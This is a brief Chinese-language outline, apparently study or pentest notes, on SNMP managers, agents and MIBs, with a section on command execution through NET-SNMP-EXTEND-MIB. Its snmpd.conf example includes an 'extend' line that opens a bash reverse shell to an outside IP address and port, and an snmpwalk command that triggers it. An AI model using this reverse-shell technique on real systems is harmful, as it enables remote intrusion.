### 协议

#### Manager

#### Agent

* 响应和处理snmp请求的程序

#### MIB

* **MIB（Management Information Base，管理信息库）是一张“结构化字典”**，定义了设备上可以被管理的“对象”的**名称、类型、读写属性等信息**。
* MIB 中对象和其功能的定义，是有标准协议规定的，也有厂商采取私有协议

### 测试工具

### 命令执行

#### NET-SNMP-EXTEND-MIB

```shell
# snmpd.conf

extend myUptime /bin/uptime
extend myDisk /bin/df -h
extend shell /bin/bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1 
```

```shell
# 遍历NET-SNMP-EXTEND-MIB节点下的对象
snmpwalk -v2c -c public 127.0.0.1 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

#### DISMAN-SCRIPT-MIB

